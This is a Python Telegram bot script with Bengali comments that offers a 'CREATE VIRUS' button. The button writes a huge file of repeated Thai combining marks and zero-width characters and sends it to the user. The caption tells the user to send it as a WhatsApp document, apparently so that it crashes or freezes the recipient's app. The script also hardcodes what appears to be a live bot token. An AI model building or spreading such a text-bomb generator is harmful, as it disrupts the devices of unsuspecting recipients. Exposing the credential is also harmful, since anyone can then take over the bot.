import logging
import sqlite3
import os
import asyncio
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ১. লগিং লেভেল (অপ্রয়োজনীয় লগ বন্ধ)
logging.basicConfig(level=logging.WARNING)

# ২. আপনার টোকেন (নিশ্চিত করুন এটি একদম সঠিক)
TOKEN = "8675593212:AAE7hOxzjsJ_rgpkesUA67cfP221dSW98sw"

# ৩. ডাটাবেস সেটআপ
def init_db():
    conn = sqlite3.connect('mr_developer_unlimited.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, count INTEGER)''')
    cursor.execute("INSERT OR IGNORE INTO stats (id, count) VALUES (1, 0)")
    conn.commit()
    conn.close()

# ৪. সুপার পাওয়ারফুল পেলোড জেনারেটর
async def generate_virus_unlimited(status_msg):
    # ইউনিক ফাইল নেম যাতে কনফ্লিক্ট না হয়
    import time
    filename = f"VIRUS_{int(time.time())}.txt"
    
    # শক্তিশালী কোড প্যাটার্ন
    pattern = "\u0E47\u0E48\u0E49\u0E4A\u0E4B\u0E4C\u0E4D" * 40
    filler = "\u200B\u200C\u200D\uFEFF" * 30
    chunk = (pattern + filler) * 500
    
    try:
        await status_msg.edit_text("⏳ ডাটাবেস লোড হচ্ছে...")
        # সরাসরি হার্ডড্রাইভে লেখা (মেমোরি সেফ)
        with open(filename, "w", encoding="utf-8") as f:
            for i in range(1, 1501): # আরও বড় ফাইল
                f.write(chunk)
                if i == 700:
                    await status_msg.edit_text("⏳ পেলোড রাইট হচ্ছে (৫০%)...")
        
        await status_msg.edit_text("✅ ১০০% সম্পন্ন! সার্ভার থেকে ডেলিভারি হচ্ছে...")
        return filename
    except Exception as e:
        print(f"Error: {e}")
        return None

# ৫. মেইন হ্যান্ডলার (সবার জন্য আনলিমিটেড)
async def handle_requests(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text: return
    
    text = update.message.text
    user_name = update.effective_user.first_name

    if text == "/start":
        keyboard = [[KeyboardButton("🚀 CREATE VIRUS")], [KeyboardButton("📊 STATUS")]]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        
        await update.message.reply_text(
            f"🔥 **M R DEVELOPER UNLIMITED PANEL** 🔥\n\nহ্যালো {user_name}! আমি প্রস্তুত।",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )

    elif text == "🚀 CREATE VIRUS":
        status_msg = await update.message.reply_text("🚀 প্রসেস শুরু হয়েছে... (ধৈর্য ধরুন)")
        
        # ব্যাকগ্রাউন্ডে জেনারেশন শুরু
        file_path = await generate_virus_unlimited(status_msg)
        
        if file_path and os.path.exists(file_path):
            try:
                # ফাইল পাঠানো
                with open(file_path, 'rb') as doc:
                    await update.message.reply_document(
                        document=doc, 
                        caption="✅ **VIRUS GENERATED!**\n\nএটি হোয়াটসঅ্যাপে ডকুমেন্ট হিসেবে পাঠান।",
                        write_timeout=60, # বড় ফাইলের জন্য সময় বাড়ানো হয়েছে
                        connect_timeout=60
                    )
                
                # আপডেট স্ট্যাটাস
                conn = sqlite3.connect('mr_developer_unlimited.db')
                cur = conn.cursor()
                cur.execute("UPDATE stats SET count = count + 1 WHERE id=1")
                conn.commit()
                conn.close()
                
            except Exception as e:
                await update.message.reply_text(f"❌ এরর: ফাইল পাঠাতে সমস্যা হয়েছে (নেটওয়ার্ক স্লো)।")
            finally:
                if os.path.exists(file_path): os.remove(file_path)
        else:
            await update.message.reply_text("❌ ফাইল তৈরিতে সমস্যা হয়েছে।")
        
        await status_msg.delete()

    elif text == "📊 STATUS":
        conn = sqlite3.connect('mr_developer_unlimited.db')
        cur = conn.cursor()
        cur.execute("SELECT count FROM stats WHERE id=1")
        total = cur.fetchone()[0]
        conn.close()
        await update.message.reply_text(f"📊 মোট তৈরি ভাইরাস: {total} টি।")

# ৬. রানার
def main():
    init_db()
    # একশন: drop_pending_updates=True জমানো এরর ক্লিয়ার করবে
    application = Application.builder().token(TOKEN).build()
    application.add_handler(MessageHandler(filters.TEXT, handle_requests))
    
    print("---------------------------------------")
    print("M R DEVELOPER Bot is Live & Ready!")
    print("---------------------------------------")
    
    application.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
                        
